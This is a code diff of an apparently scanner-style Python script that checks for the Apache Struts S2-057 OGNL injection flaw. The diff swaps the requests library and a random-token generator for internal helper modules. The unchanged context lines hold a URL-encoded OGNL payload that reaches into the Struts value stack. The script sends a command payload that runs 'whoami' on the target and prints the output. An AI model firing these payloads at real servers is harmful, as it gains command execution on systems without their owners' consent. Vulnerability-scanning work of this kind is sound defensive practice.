@@ -8,19 +8,13 @@ description: S2-057漏洞可执行任意命令
 import sys
 import time
 import urllib
-import string
-import random
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class S2_057_BaseVerify:
     def __init__(self, url):
         self.url = url
-        self.capta='' 
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words) 
+        self.capta = get_capta() 
         self.check_payload =  '''/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct
                                                 %3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr
                                                 %3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou
@@ -51,16 +45,16 @@ class S2_057_BaseVerify:
                 self.url = "http://" + self.url
             check_url = self.url + self.check_payload
             check_url1 = self.url + self.check_payload1
-            check_req = requests.get(check_url, allow_redirects=False)
-            check_req1 = requests.get(check_url1, allow_redirects=False)
+            check_req = request.get(check_url)
+            check_req1 = request.get(check_url1)
             if check_req.status_code == 200 and self.capta in check_req.text and check_req1.status_code != 200 :
                 cmd_url = self.url + self.cmd_payload
-                cmd_req = requests.get(cmd_url, allow_redirects=False)
+                cmd_req = request.get(cmd_url)
                 print ('存在S2-057漏洞,执行whoami命令成功，执行结果是:', cmd_req.text)
                 return True
             elif check_req1.status_code == 200 and self.capta in check_req.text and check_req.status_code != 200:
                 cmd_url = self.url + self.cmd_payload1
-                cmd_req = requests.get(cmd_url, allow_redirects=False)
+                cmd_req = request.get(cmd_url)
                 print ('存在S2-057漏洞,执行whoami命令成功，执行结果是:', cmd_req.text)
                 return True
             else:
